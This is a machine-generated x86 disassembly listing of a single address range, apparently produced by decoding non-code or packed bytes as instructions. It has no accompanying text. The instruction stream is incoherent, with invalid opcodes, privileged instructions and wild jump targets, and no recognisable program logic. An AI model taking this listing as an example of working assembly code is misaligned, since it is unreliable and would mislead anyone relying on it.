  414a92:	jmp    0x414ac5
  414a94:	push   ebp
  414a95:	pop    ebp
  414a96:	scas   eax,DWORD PTR es:[edi]
  414a97:	pop    ebp
  414a98:	enter  0x645e,0x31
  414a9c:	call   FWORD PTR [edx]
  414a9e:	sahf   
  414a9f:	sbb    DWORD PTR [edi],edi
  414aa1:	ins    DWORD PTR es:[edi],dx
  414aa2:	lock and esi,DWORD PTR [ecx*2-0x26cde5e3]
  414aaa:	call   0xde2c3d16
  414aaf:	(bad)  
  414ab0:	jns    0x414ad1
  414ab2:	fsub   st,st(2)
  414ab4:	repnz (bad) 
  414ab6:	fimul  WORD PTR [ecx]
  414ab8:	icebp  
  414ab9:	ror    BYTE PTR [ebx+0x2c],cl
  414abc:	jo     0x414b30
  414abe:	int    0x9f
  414ac0:	xchg   ebp,eax
  414ac1:	jae    0x414ae2
  414ac3:	or     eax,0x1c46ff9
  414ac8:	jge    0x414a62
  414aca:	out    0x18,eax
  414acc:	outs   dx,BYTE PTR ds:[esi]
  414acd:	imul   ecx,DWORD PTR [esi+0xc],0xffffffb4
  414ad1:	dec    ebp
  414ad2:	dec    ebp
  414ad3:	cs hlt 
  414ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad6:	int    0xf5
  414ad8:	sbb    al,dh
  414ada:	xor    al,0xb5
  414adc:	sub    edx,DWORD PTR [edx-0x174ab06d]
  414ae2:	inc    ecx
  414ae3:	pop    ecx
  414ae4:	mov    dl,0x8e
  414ae6:	enter  0x9e9c,0x9a
  414aea:	jl     0x414abe
  414aec:	mov    edx,0xe1d81591
  414af1:	iret   
  414af2:	xlat   BYTE PTR ds:[ebx]
  414af3:	adc    eax,0xc12502c4
  414af8:	neg    DWORD PTR [ecx+0x2d]
  414afb:	ins    BYTE PTR es:[edi],dx
  414afc:	or     eax,0xf692aa4f
  414b01:	add    esi,ebx
  414b03:	pop    ds
  414b04:	arpl   WORD PTR [edx+0x579b5deb],dx
  414b0a:	jmp    0x99a3f7b5
  414b0f:	mov    ecx,0x69b5c152
  414b14:	js     0x414ac6
  414b16:	mov    dh,0xe4
  414b18:	mov    esi,0xb7a1ef31
  414b1d:	mov    bh,0x10
  414b1f:	mov    cl,0x3f
  414b21:	aam    0x38
  414b23:	out    dx,eax
  414b24:	fistp  DWORD PTR [ecx+0x26f6bc81]
  414b2a:	rcr    BYTE PTR [eax+0x5b],1
  414b2d:	jns    0x414aed
  414b2f:	in     eax,dx
  414b30:	je     0x414b77
  414b32:	or     BYTE PTR [edi],dh
  414b34:	xor    bl,al
  414b36:	xchg   edi,eax
  414b37:	dec    edi
  414b38:	(bad)  
  414b39:	in     al,dx
  414b3a:	pop    ebx
  414b3b:	pop    edx
  414b3c:	(bad)  
  414b3d:	xor    al,0xe1
  414b3f:	mov    esi,0x2f56f95
  414b44:	hlt    
  414b45:	stos   DWORD PTR es:[edi],eax
  414b46:	inc    ebx
  414b47:	jnp    0x414b34
  414b49:	sub    ebx,esp
  414b4b:	out    0xfe,al
  414b4d:	imul   ecx,ecx,0xffffff8e
  414b50:	pop    ebp
  414b51:	xchg   edi,eax
  414b52:	mov    esp,0x801c4d30
  414b57:	dec    DWORD PTR [edx+0x69]
  414b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b5b:	mov    ecx,gs
  414b5d:	mov    bl,BYTE PTR [ecx]
  414b5f:	(bad)  
  414b60:	aas    
  414b61:	or     DWORD PTR ds:0xf425c775,esp
  414b67:	mov    ebx,0x666380a1
  414b6c:	xchg   ebp,eax
  414b6d:	vmread DWORD PTR [edx-0x35],esp
  414b71:	shr    BYTE PTR [eax],1
  414b73:	push   eax
  414b74:	loop   0x414b52
  414b76:	cs dec esi
  414b78:	push   ebx
  414b79:	and    BYTE PTR [ebx],bl
  414b7b:	push   cs
  414b7c:	add    DWORD PTR [edi-0x702ecd38],ebx
  414b82:	outs   dx,DWORD PTR ds:[esi]
  414b83:	test   esi,0xa87d61ba
  414b89:	imul   ebx,edx,0x63599cae
  414b8f:	push   cs
  414b90:	adc    al,0xb9
  414b92:	mov    ebp,esi
  414b94:	inc    DWORD PTR [ecx]
  414b96:	jae    0x414baa
  414b98:	xor    DWORD PTR ds:0xfe30355e,ebx
  414b9e:	nop
  414b9f:	pusha  
  414ba0:	outs   dx,BYTE PTR ds:[esi]
  414ba1:	mov    ebp,?
  414ba3:	fstp   QWORD PTR [edi+eiz*1]
  414ba6:	xor    ah,BYTE PTR [edi]
  414ba8:	inc    edi
  414ba9:	xor    ebp,ebx
  414bab:	mov    bh,0xbc
  414bad:	adc    eax,0x64a8adcc
  414bb2:	add    al,0x60
  414bb4:	sub    DWORD PTR [ecx-0x6a],ebp
  414bb7:	mov    ebx,0xff3429a7
  414bbc:	adc    DWORD PTR [ecx-0x497568b8],ebx
  414bc2:	adc    dh,BYTE PTR [ebx+0x30]
  414bc5:	xchg   edx,eax
  414bc6:	out    dx,eax
  414bc7:	lods   eax,DWORD PTR ds:[esi]
  414bc8:	ret    0xfb25
  414bcb:	daa    
  414bcc:	mov    eax,ss:0x9979fee5
  414bd2:	jnp    0x414bd1
  414bd4:	rcr    BYTE PTR [ebp+0x17],cl
  414bd7:	cs stos DWORD PTR es:[edi],eax
  414bd9:	dec    ebp
  414bda:	test   eax,0xe08787af
  414bdf:	adc    ebx,DWORD PTR [ebx]
  414be1:	add    DWORD PTR [ebp-0x735ff0f3],ecx
  414be7:	inc    eax
  414be8:	jno    0x414c58
  414bea:	push   ss
  414beb:	mov    dl,0xfe
  414bed:	sbb    eax,0x4fa81ae1
  414bf2:	push   ebx
  414bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf4:	jnp    0x414c38
  414bf6:	fcomi  st,st(1)
  414bf8:	imul   DWORD PTR [edi-0x6d1bc97e]
  414bfe:	test   al,0x3b
  414c00:	ret    0x8fee
  414c03:	sbb    al,BYTE PTR [eax]
  414c05:	dec    edi
  414c06:	jge    0x414bcc
  414c08:	jle    0x414c27
  414c0a:	adc    ah,BYTE PTR [ebp+0x3e]
  414c0d:	dec    eax
  414c0e:	ror    DWORD PTR [esi-0x2e],0x9
  414c12:	sub    edx,DWORD PTR [ebp+0x9]
  414c15:	add    eax,0xc1647682
  414c1a:	or     ebx,DWORD PTR [ecx+0x432b66cf]
  414c20:	(bad)  
  414c21:	mov    ds:0xb3194833,eax
  414c26:	mov    dl,0x5d
  414c28:	xor    esi,DWORD PTR [eax-0x14]
  414c2b:	mov    BYTE PTR [edx+0x318b730c],bl
  414c31:	cld    
  414c32:	ret    0x9ac9
  414c35:	dec    ecx
  414c36:	pop    ds
  414c37:	xchg   DWORD PTR [edx+0x3be65b78],ebp
  414c3d:	idiv   esp
  414c3f:	push   cs
  414c40:	cwde   
  414c41:	xor    esp,DWORD PTR [ecx+0x4b]
  414c44:	inc    edx
  414c45:	jb     0x414c05
  414c47:	lods   al,BYTE PTR ds:[esi]
  414c48:	outs   dx,BYTE PTR ds:[esi]
  414c49:	mov    dl,0xc3
  414c4b:	gs mov ebp,0x1e4ddea0
  414c51:	fnsave [edi+0x64]
  414c54:	dec    eax
  414c55:	cmc    
  414c56:	cmp    al,0x96
  414c58:	mov    gs,WORD PTR [edx-0x1aedc257]
  414c5e:	iret   
  414c5f:	mov    eax,0x46f44847
  414c64:	inc    ecx
  414c65:	std    
  414c66:	pushf  
  414c67:	push   0x8c2115db
  414c6c:	sub    edx,esi
  414c6e:	test   BYTE PTR [eax],0x56
  414c71:	push   esp
  414c72:	pop    esp
  414c73:	popf   
  414c74:	mul    BYTE PTR [edi-0x75]
  414c77:	lods   eax,DWORD PTR ds:[esi]
  414c78:	imul   DWORD PTR [eax+esi*8-0x33b01157]
  414c7f:	shl    BYTE PTR ds:[ecx-0x7f01d03a],1
  414c86:	cmp    dl,BYTE PTR [ecx+0x2becf3a6]
  414c8c:	popf   
  414c8d:	add    esi,ecx
  414c8f:	into   
  414c90:	mov    ?,WORD PTR [ecx+0x22]
  414c93:	(bad)  
  414c94:	sbb    eax,0xea80b3fa
  414c99:	push   edi
  414c9a:	pop    ecx
  414c9b:	(bad)  
  414c9c:	in     al,dx
  414c9d:	retf   0x624
  414ca0:	jb     0x414c70
  414ca2:	push   eax
  414ca3:	ss pushf 
  414ca5:	ins    BYTE PTR es:[edi],dx
  414ca6:	hlt    
  414ca7:	xchg   esi,eax
  414ca8:	(bad)  
  414caa:	or     ah,BYTE PTR [eax-0x49f2acce]
  414cb0:	jg     0x414cd0
  414cb2:	inc    ebp
  414cb3:	adc    al,BYTE PTR [ebx+0x63]
  414cb6:	jp     0x414c84
  414cb8:	xor    BYTE PTR ds:0x14dcc15a,0x8e
  414cbf:	les    edx,FWORD PTR [ebx-0x1]
  414cc2:	push   ebx
  414cc3:	mov    ds:0x7e6ee9d5,eax
  414cc8:	call   0x5e42:0x91173b56
  414ccf:	xor    dl,0xbf
  414cd2:	adc    DWORD PTR [edi+edx*2+0x76],ebp
  414cd6:	fldenv [edx-0x2524e12e]
  414cdc:	fsubp  st(3),st
  414cde:	test   DWORD PTR [edx+0x7c],ebx
  414ce1:	mov    ebp,0xb64ce80c
  414ce6:	je     0x414cc4
  414ce8:	nop
  414ce9:	ss xor dl,al
  414cec:	nop
  414ced:	jmp    0x5a07e6a4
  414cf2:	clc    
  414cf3:	jnp    0x414cd2
  414cf5:	int3   
  414cf6:	mov    al,0x53
  414cf8:	pop    esp
  414cf9:	dec    esi
  414cfa:	imul   ch
  414cfc:	retf   0x6406
  414cff:	mov    ds:0x8495fb8a,eax
  414d04:	sar    DWORD PTR [ecx+0x6],0x20
  414d08:	jmp    0xbd89:0x39f2f3d2
  414d0f:	stos   DWORD PTR es:[edi],eax
  414d10:	dec    BYTE PTR [ecx]
  414d12:	or     al,0xe9
  414d14:	add    eax,0x2595512d
  414d19:	sbb    eax,0x7a876033
  414d1e:	mov    dh,0x85
  414d20:	xchg   esp,eax
  414d21:	(bad)  
  414d22:	sub    edx,DWORD PTR [esi-0x63]
  414d25:	nop
  414d26:	loope  0x414da0
  414d28:	jb     0x414cd2
  414d2a:	jg     0x414d09
  414d2c:	inc    esi
  414d2d:	xor    eax,ebx
  414d2f:	call   0xa696:0x580cad0
  414d36:	out    dx,eax
  414d37:	les    ebp,FWORD PTR [ebp-0x19923ba7]
  414d3d:	cwde   
  414d3e:	mov    ecx,0x7af53973
  414d43:	xchg   esi,eax
  414d44:	adc    DWORD PTR [esi+0x7fd64be8],edx
  414d4a:	lock mov ch,0xa3
  414d4d:	(bad)  
  414d4e:	xor    ecx,DWORD PTR [edx]
  414d50:	sbb    BYTE PTR [ecx+0x0],ch
  414d53:	lods   eax,DWORD PTR ds:[esi]
  414d54:	push   edi
  414d55:	pop    ebx
  414d56:	loop   0x414d1b
  414d58:	int3   
  414d59:	imul   ecx,DWORD PTR [ecx+0x284afee2],0xbdaac9c4
  414d63:	test   BYTE PTR [eax-0xe],0x55
  414d67:	dec    eax
  414d68:	xchg   esi,eax
  414d69:	cmc    
  414d6a:	sbb    esi,edx
  414d6c:	jmp    0xf73f305b
  414d71:	aad    0xe8
  414d73:	das    
  414d74:	scas   al,BYTE PTR es:[edi]
  414d75:	add    ch,dl
  414d77:	fdiv   QWORD PTR [ecx-0xbdf879d]
  414d7d:	shr    BYTE PTR [esi+0x3c],0x58
  414d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d82:	dec    esi
  414d83:	fs (bad) 
  414d85:	mov    ds:0xbc60b6ae,eax
  414d8a:	or     esp,DWORD PTR [edx]
  414d8c:	dec    esi
  414d8d:	pop    edx
  414d8e:	pusha  
  414d8f:	popa   
  414d90:	fidivr WORD PTR [edi-0x651885db]
  414d96:	imul   ebx,DWORD PTR [ecx],0xffffffba
  414d99:	aaa    
  414d9a:	shl    DWORD PTR es:[eax-0x611d66c9],cl
  414da1:	push   ss
  414da2:	pop    edx
  414da3:	imul   edi,DWORD PTR ds:0xcd5ae2ed,0x2e71992
  414dad:	adc    ecx,ebp
  414daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414db0:	call   0xa3ba:0x8b8151ef
  414db7:	mov    al,0x52
  414db9:	sub    edi,DWORD PTR [esi+0x3b]
  414dbc:	stc    
  414dbd:	jg     0x414daa
  414dbf:	sub    DWORD PTR [ecx],0xfffffff5
  414dc2:	jecxz  0x414db8
  414dc4:	(bad)  
  414dc5:	sub    DWORD PTR [esi],esi
  414dc7:	div    esi
  414dc9:	xor    edx,DWORD PTR [ebx-0x2195bc4c]
  414dcf:	call   0xe0c5c81
  414dd4:	jnp    0x414dd6
  414dd6:	add    al,BYTE PTR [edi+ebp*4-0x35]
  414dda:	mov    ecx,0xcf6fac1b
  414ddf:	dec    edx
  414de0:	cs inc ecx
  414de2:	mov    cl,0x2e
  414de4:	fnsave [esi]
  414de6:	sub    DWORD PTR [esp+ebp*1],ebp
  414de9:	fcmovnu st,st(1)
  414deb:	popf   
  414dec:	lods   eax,DWORD PTR ds:[esi]
  414ded:	xchg   edx,eax
  414dee:	jns    0x414d75
  414df0:	fmul   st,st(3)
  414df2:	xchg   edx,eax
  414df3:	pop    eax
  414df4:	dec    ecx
  414df5:	mov    bl,BYTE PTR [edi+ebp*2]
  414df8:	sbb    DWORD PTR [ecx-0xa],esp
  414dfb:	lahf   
  414dfc:	pop    esp
  414dfd:	push   ebx
  414dfe:	je     0x414def
  414e00:	sbb    eax,0x51e91e8b
  414e05:	pop    eax
  414e06:	(bad)  
  414e07:	(bad)  
  414e08:	rcl    BYTE PTR [edi-0x73b96f14],cl
  414e0e:	inc    edx
  414e0f:	adc    bh,dl
  414e11:	xchg   esp,eax
  414e12:	(bad)
  414e16:	iret   
  414e17:	and    eax,ebx
  414e19:	pop    ss
  414e1a:	inc    edi
  414e1b:	sbb    DWORD PTR [esi],ebx
  414e1d:	xchg   ebx,eax
  414e1e:	ret    0xe042
  414e21:	les    eax,FWORD PTR [edi+0x38]
  414e24:	fild   QWORD PTR [esi]
  414e26:	xlat   BYTE PTR ds:[ebx]
  414e27:	addr16 inc ebx
  414e29:	pop    eax
  414e2a:	iret   
  414e2b:	add    eax,esi
  414e2d:	lods   al,BYTE PTR ds:[esi]
  414e2e:	out    dx,eax
  414e2f:	push   esi
  414e30:	xor    BYTE PTR [edx],bh
  414e32:	aaa    
  414e33:	es loopne 0x414dfd
  414e36:	inc    esp
  414e37:	(bad)  
  414e38:	(bad)
  414e3d:	adc    eax,0x19ca4e16
  414e42:	dec    eax
  414e43:	(bad)
  414e46:	and    dl,BYTE PTR [esi-0x3a8e25]
  414e4c:	xor    eax,ebp
  414e4e:	sbb    DWORD PTR [ebx],eax
  414e50:	ret    
  414e51:	fsubr  DWORD PTR [ebx+edi*8+0x28]
  414e55:	mov    ecx,0x2a05fe0f
  414e5a:	clc    
  414e5b:	sbb    esi,DWORD PTR [edi-0x2a]
  414e5e:	stos   BYTE PTR es:[edi],al
  414e5f:	icebp  
  414e60:	fstp   TBYTE PTR [ecx+0x47a9c63f]
  414e66:	out    0x6a,al
  414e68:	mov    bh,0x4d
  414e6a:	mov    bl,0x2e
  414e6c:	ins    BYTE PTR es:[edi],dx
  414e6d:	cmp    eax,0x577dcacb
  414e72:	dec    ecx
  414e73:	mov    dl,0xea
  414e75:	mov    bh,0x7b
  414e77:	jge    0x414ea6
  414e79:	push   ebx
  414e7a:	mov    ebx,edx
  414e7c:	mov    ebx,0x6d1b41e0
  414e81:	xchg   edx,eax
  414e82:	push   esp
  414e83:	dec    eax
  414e84:	or     DWORD PTR [edx+0x694cf1f7],0xf360fb15
  414e8e:	call   0xae6221eb
  414e93:	pop    eax
  414e94:	int3   
  414e95:	mov    al,dl
  414e97:	in     eax,dx
  414e98:	or     dl,dl
  414e9a:	sar    DWORD PTR [ebx],1
  414e9c:	inc    ecx
  414e9d:	ja     0x3d077732
  414ea3:	aam    0xdf
  414ea5:	mov    dh,0x39
  414ea7:	or     edx,eax
  414ea9:	push   esp
  414eaa:	dec    edi
  414eab:	sahf   
  414eac:	adc    BYTE PTR [ecx-0x77a15059],bl
  414eb2:	jecxz  0x414e58
  414eb4:	call   0x66:0xdfc16431
  414ebb:	jl     0x414e51
  414ebd:	call   FWORD PTR [ecx+eiz*8+0x52]
  414ec1:	out    dx,al
  414ec2:	test   ecx,0xe4eb4d7c
  414ec8:	push   edx
  414ec9:	xchg   esi,eax
  414eca:	and    DWORD PTR ds:0x93290f00,ebp
  414ed0:	cwde   
  414ed1:	jbe    0x414f3f
  414ed3:	adc    ah,0xfd
  414ed6:	cs or  bh,dh
  414ed9:	and    ch,cl
  414edb:	daa    
  414edc:	xchg   edi,eax
  414edd:	xchg   ebp,eax
  414ede:	pop    eax
  414edf:	mov    dh,0x38
  414ee1:	push   edi
  414ee2:	cmp    BYTE PTR [eax+eax*8+0x1f],ch
  414ee6:	push   esp
  414ee7:	(bad)  
  414ee8:	adc    al,0x32
  414eea:	aas    
  414eeb:	or     esi,DWORD PTR [edx+edx*1-0x11]
  414eef:	js     0x414f05
  414ef1:	jmp    0x44b2a44a
  414ef6:	test   eax,0xd99db7e1
  414efb:	test   BYTE PTR [ebx],ch
  414efd:	mov    bl,0xb2
  414eff:	out    0x9c,al
  414f01:	fcomp  DWORD PTR [edx+eiz*1]
  414f04:	xchg   ebx,eax
  414f05:	adc    eax,0xa45bb638
  414f0a:	enter  0x2b8a,0x44
  414f0e:	mov    WORD PTR [edi+ebx*2+0x23],es
  414f12:	cmc    
  414f13:	jbe    0x414f41
  414f15:	pusha  
  414f16:	mov    bl,0xd8
  414f18:	inc    esp
  414f19:	sub    al,0xa5
  414f1b:	cmp    edi,DWORD PTR [edi-0x4bd953fb]
  414f21:	sti    
  414f22:	cmp    eax,0xbffe1d6b
  414f27:	sbb    bh,BYTE PTR [esi+edx*4+0x54]
  414f2b:	xor    al,0x76
  414f2d:	push   cs
  414f2e:	ins    BYTE PTR es:[edi],dx
  414f2f:	jmp    0x414eca
  414f31:	dec    ecx
  414f32:	aad    0xec
  414f34:	sar    ch,cl
  414f36:	sbb    esp,DWORD PTR [esi+0x2]
  414f39:	retf   0x8c0f
  414f3c:	mov    eax,ds:0x21de0ec9
  414f41:	inc    edx
  414f42:	sub    eax,0xe57072df
  414f47:	dec    edi
  414f48:	xchg   edi,eax
  414f49:	in     al,0x91
  414f4b:	test   edx,0x4b450baa
  414f51:	out    dx,al
  414f52:	dec    esi
  414f53:	jmp    0x414efc
  414f55:	ds xchg edi,eax
  414f57:	ss push 0x5485fcea
  414f5d:	cmp    eax,0xd5eae93e
  414f62:	inc    ebx
  414f63:	adc    eax,0x97ff2885
  414f68:	push   ecx
  414f69:	mov    WORD PTR [eax+eax*1],fs
  414f6c:	cli    
  414f6d:	pop    ebx
  414f6e:	loope  0x414f3e
  414f70:	push   cs
  414f71:	daa    
  414f72:	call   0x4826f4c2
  414f77:	ins    BYTE PTR es:[edi],dx
  414f78:	mov    WORD PTR [eax+0xa],es
  414f7b:	mov    esi,0x9d2ffefb
  414f80:	adc    DWORD PTR [ebx-0x24],0xffffff94
  414f84:	nop
  414f85:	into   
  414f86:	stos   BYTE PTR es:[edi],al
  414f87:	xor    ebp,edi
  414f89:	xor    DWORD PTR cs:[esi-0x74],esp
  414f8d:	and    esp,DWORD PTR [edi+eax*1+0x23f8c11d]
  414f94:	loopne 0x414f75
  414f96:	push   0x218a7bf4
  414f9b:	push   eax
  414f9c:	mov    dh,0xe8
  414f9e:	ror    BYTE PTR [edi],0x2
  414fa1:	stc    
  414fa2:	inc    ecx
  414fa3:	arpl   WORD PTR [ecx-0x3209386c],dx
  414fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414faa:	fs sti 
  414fac:	cmp    BYTE PTR ds:0x7d0c59d2,bl
  414fb2:	cld    
  414fb3:	xchg   edi,eax
  414fb4:	push   es
  414fb5:	mov    esp,0x6dd71964
  414fba:	add    esp,DWORD PTR [ecx]
  414fbc:	or     eax,0xe259f992
  414fc1:	adc    ebp,ebp
  414fc3:	icebp  
  414fc4:	jg     0x414fc9
  414fc6:	sub    DWORD PTR [ebx+0x7],esi
  414fc9:	and    eax,0x1464f8f0
  414fce:	pop    ebx
  414fcf:	pusha  
  414fd0:	add    eax,0xc46ffc36
  414fd5:	pop    esp
  414fd6:	std    
  414fd7:	mov    eax,0x9d4de279
  414fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fdd:	call   0xebd70ac2
  414fe2:	mov    ecx,0x6c220427
  414fe7:	push   edi
  414fe8:	fmul   QWORD PTR [edi+0x77]
  414feb:	test   DWORD PTR [esp+edx*1+0x5a],0x7611e059
  414ff3:	xchg   ecx,eax
  414ff4:	mov    eax,0x1f56cf65
  414ff9:	mov    dl,BYTE PTR [edi-0x31]
  414ffc:	xchg   esi,eax
  414ffd:	sbb    edi,DWORD PTR [edi-0x55ff910d]
  415003:	pushf  
  415004:	lods   eax,DWORD PTR ds:[esi]
  415005:	retf   
  415006:	jge    0x414fe5
  415008:	add    DWORD PTR [ebx-0x56],esp
  41500b:	scas   eax,DWORD PTR es:[edi]
  41500c:	sub    BYTE PTR [ebx-0x11],ah
  41500f:	not    BYTE PTR [eax+0x4d442574]
  415015:	jnp    0x414fbe
  415017:	jmp    0x41506b
  415019:	xor    DWORD PTR [edx-0x21],0x3192584e
  415020:	mov    bl,0x69
  415022:	cmp    al,0xf
  415024:	cmp    ecx,DWORD PTR [eax]
  415026:	dec    esi
  415027:	call   0x6c4f3854
  41502c:	and    al,0xa1
  41502e:	lock cld 
  415030:	in     eax,dx
  415031:	xchg   ebx,eax
  415032:	push   edx
  415033:	int    0x11
  415035:	mov    eax,0xf77e3bf2
  41503a:	cmp    ebx,edi
  41503c:	push   ecx
  41503d:	inc    esi
  41503e:	push   0x2d42d539
  415043:	retf   0xf5ff
  415046:	inc    esi
  415047:	dec    edx
  415048:	jle    0x4150bb
  41504a:	mov    WORD PTR [esi-0x4ba19452],es
  415050:	push   ebx
  415051:	add    BYTE PTR [esi-0x5ff0081e],ah
  415057:	pop    esi
  415058:	xor    dh,BYTE PTR [edi+0x54]
  41505b:	mov    al,dl
  41505d:	outs   dx,DWORD PTR ds:[esi]
  41505e:	lahf   
  41505f:	mov    eax,0x92922af
  415064:	add    bl,BYTE PTR [ebp+0x2b]
  415067:	xchg   ecx,eax
  415068:	xchg   esi,eax
  415069:	mov    dl,0x2b
  41506b:	sbb    ah,BYTE PTR [edi-0x42]
  41506e:	imul   si,WORD PTR [esi-0x56],0x5f
  415073:	add    eax,DWORD PTR ds:0x4ecf6171
  415079:	push   ecx
  41507a:	pop    esp
  41507b:	or     DWORD PTR [ebp-0xa],ebp
  41507e:	push   ds
  41507f:	xchg   ecx,eax
  415080:	jae    0x415090
  415082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415083:	mov    eax,ds:0x29f35b9b
  415088:	jnp    0x4150b6
  41508a:	xor    al,0x26
  41508c:	inc    esi
  41508d:	xor    ecx,DWORD PTR [edi]
  41508f:	mov    edi,0xdb66ebce
  415094:	rcr    DWORD PTR [ebp+0xc7d914e],0x7f
  41509b:	xchg   esi,eax
  41509c:	mov    esi,0xe72c3dea
  4150a1:	xor    eax,0xf49edef8
  4150a6:	mov    BYTE PTR [ecx],al
  4150a8:	add    esi,edi
  4150aa:	add    DWORD PTR [ebx],edx
  4150ac:	in     al,dx
  4150ad:	mov    ds:0x58548665,eax
  4150b2:	retf   0x694f
  4150b5:	add    dl,al
  4150b7:	imul   edi,eax,0x4b
  4150ba:	int3   
  4150bb:	jns    0x41512f
  4150bd:	arpl   WORD PTR [ecx-0x52a4e548],dx
  4150c3:	ins    DWORD PTR es:[edi],dx
  4150c4:	jno    0x415067
  4150c6:	mov    dh,0x5c
  4150c8:	add    BYTE PTR [edx],dl
  4150ca:	fucomp st(6)
  4150cc:	cld    
  4150cd:	fisttp QWORD PTR es:[esi-0x2c]
  4150d1:	call   0x8c7e:0xb425c987
  4150d8:	test   al,0xe
  4150da:	inc    ecx
  4150db:	dec    ebx
  4150dc:	sbb    al,BYTE PTR [edi+0x1af7b52e]
  4150e2:	jg     0x415101
  4150e4:	nop
  4150e5:	and    edx,esp
  4150e7:	and    eax,0x875250b9
  4150ec:	adc    DWORD PTR [esi+0x4c],esi
  4150ef:	jno    0x4150d4
  4150f1:	fdiv   st,st(4)
  4150f3:	fstp   TBYTE PTR [edi]
  4150f5:	adc    ah,BYTE PTR [esi]
  4150f7:	cmp    ch,BYTE PTR [eax+ecx*1+0x2b]
  4150fb:	add    dh,bh
  4150fd:	or     al,0x18
  4150ff:	je     0x415129
  415101:	sbb    al,0x9a
  415103:	ins    DWORD PTR es:[edi],dx
  415104:	scas   eax,DWORD PTR es:[edi]
  415105:	mov    ah,0xcf
  415107:	call   0x7c49:0x113e4456
  41510e:	imul   ecx,DWORD PTR [esp+eax*2],0x57c64bf9
  415115:	sub    BYTE PTR [eax-0x67ba341a],dl
  41511b:	inc    edi
  41511c:	and    BYTE PTR [eax],al
  41511e:	mov    DWORD PTR [edi-0x60b3b49d],esp
  415124:	clc    
  415125:	js     0x4150a8
  415127:	mov    eax,ds:0x3ae16f3e
  41512c:	loopne 0x4150bc
  41512e:	inc    esi
  41512f:	into   
  415130:	mov    DWORD PTR [edi+0x8e66fd7],edi
  415136:	or     DWORD PTR [ebx-0x5f0baf32],eax
  41513c:	xor    BYTE PTR [esi-0x5d],0xc
  415140:	ins    BYTE PTR es:[edi],dx
  415141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415142:	xchg   ebp,eax
  415143:	cmp    BYTE PTR [ebp+0x57],bl
  415146:	sub    al,0x9e
  415148:	cmp    esp,ebx
  41514a:	scas   eax,DWORD PTR es:[edi]
  41514b:	mov    cl,0xcd
  41514d:	lods   al,BYTE PTR ds:[esi]
  41514f:	add    DWORD PTR [eax],ecx
  415151:	add    esp,0x0
  415154:	xchg   al,dl
  415156:	(bad)  
  415159:	es gs cmp al,0x18
  41515d:	jae    0x415137
  41515f:	lea    ecx,[eax+ebp*4-0x310de05c]
  415166:	xor    bh,BYTE PTR [edi]
  415168:	arpl   WORD PTR [ecx+0x543e49ab],ax
  41516e:	mov    esp,0x5cf7ffb7
  415173:	or     esp,ebp
  415175:	ins    DWORD PTR es:[edi],dx
  415176:	pop    ecx
  415177:	or     dh,BYTE PTR [ecx-0x10]
  41517a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41517b:	sti    
  41517c:	stc    
  41517d:	mov    esp,0xb4648fcd
  415182:	pop    ebx
  415183:	cmp    ebx,ebx
  415185:	daa    
  415186:	pop    eax
  415187:	xor    eax,0xf73322c6
  41518c:	mov    ebx,0x29d72cc6
  415191:	sbb    ebx,ebx
  415193:	std    
  415194:	retf   0x98fc
  415197:	push   0x858dbe1c
  41519c:	mov    cl,0x57
  41519e:	mov    ds:0x63a00669,al
  4151a3:	out    0x32,al
  4151a5:	test   BYTE PTR [ebx],cl
  4151a7:	add    DWORD PTR ds:0x15206bab,edx
  4151ad:	jo     0x4151a3
  4151af:	clc    
  4151b0:	sar    DWORD PTR [eax],0x1
  4151b3:	inc    eax
  4151b4:	jle    0x4151a9
  4151b6:	adc    eax,0x335c943c
  4151bb:	fwait
  4151bc:	jge    0x4151cc
  4151be:	sub    eax,0xd2e31265
  4151c3:	inc    ebx
  4151c4:	test   BYTE PTR [ecx-0x2b],bh
  4151c7:	add    DWORD PTR ds:0x357795b2,ebp
  4151cd:	jo     0x4151df
  4151cf:	ja     0x41518d
  4151d1:	push   0x7004651f
  4151d6:	ins    BYTE PTR es:[edi],dx
  4151d7:	fadd   DWORD PTR [edx+0x77]
  4151da:	push   esi
  4151db:	sub    ebx,DWORD PTR [eax+edi*8]
  4151de:	xchg   esp,eax
  4151df:	lea    ecx,[esi+ecx*4]
  4151e2:	sub    dh,bh
  4151e4:	cmp    BYTE PTR [ebp+0x7387b5fa],0x10
  4151eb:	adc    BYTE PTR [ebx-0x6ce894eb],ah
  4151f1:	or     DWORD PTR [edi+0x4d],0x184aaa3c
  4151f8:	shl    DWORD PTR [esi],0x31
  4151fb:	fsubr  QWORD PTR [eax]
  4151fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151fe:	jge    0x4151cd
  415200:	(bad)  
  415201:	(bad)  
  415202:	push   ds
  415203:	addr16 cld 
  415205:	pop    ecx
  415206:	test   al,0x7
  415208:	jecxz  0x4151ee
  41520a:	out    dx,al
  41520b:	mov    WORD PTR ds:0xe156d82a,?
  415211:	outs   dx,DWORD PTR ds:[esi]
  415212:	push   eax
  415213:	sub    bl,0x29
  415216:	repz adc al,0x38
  415219:	iret   
  41521a:	xchg   ebp,eax
  41521b:	mov    ds:0xe51dd5a0,al
  415220:	lock call 0x7ca4bd6d
  415226:	lea    ebx,[edx]
  415228:	ins    BYTE PTR es:[edi],dx
  415229:	out    0xc9,al
  41522b:	sahf   
  41522c:	mov    al,ds:0x36e06020
  415231:	or     ah,BYTE PTR [esi+0x25]
  415234:	or     bl,BYTE PTR [esp+ebp*2-0x6bb55674]
  41523b:	dec    esp
  41523d:	xor    eax,0x5be0dcdf
  415242:	ins    DWORD PTR es:[edi],dx
  415243:	sbb    BYTE PTR [eax+0x60d9c3b7],0xfa
  41524a:	inc    ecx
  41524b:	out    dx,eax
  41524c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41524d:	dec    edi
  41524e:	ds mov dl,0x6c
  415251:	inc    esi
  415252:	push   eax
  415253:	sub    ebx,ecx
  415255:	cmp    BYTE PTR [ecx-0x7d],ah
  415258:	iret   
  415259:	sahf   
  41525a:	mov    ah,0xc3
